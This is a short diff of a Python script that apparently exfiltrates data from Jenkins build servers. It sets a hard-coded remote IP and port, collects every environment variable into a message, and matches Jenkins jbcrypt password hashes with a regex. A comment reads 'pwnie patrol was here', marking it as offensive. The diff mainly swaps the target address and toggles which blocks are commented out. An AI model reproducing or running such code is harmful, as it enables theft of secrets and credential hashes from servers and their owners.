@@ -17,10 +17,10 @@ import pwd
 import fileinput
 import time
 import pprint
-TCP_IP = '4.130.139'
-TCP_PORT = 50007
+TCP_IP = '50.56.249.120'
+TCP_PORT = 50000
 BUFFER_SIZE = 1024
-message = "" 
+message = ""
 
 
 r = re.compile(r"#jbcrypt:[^<]+")
@@ -28,6 +28,7 @@ r = re.compile(r"#jbcrypt:[^<]+")
 envs = os.environ
 message = pprint.pformat(dict(envs))
 
+"""
 """
 #
 #
@@ -39,6 +40,7 @@ for res in results:
                 print line,
 
 message = 'using jenkins: %s ' % str(results)
+"""
 """
 # pwnie patrol was here.
 try:
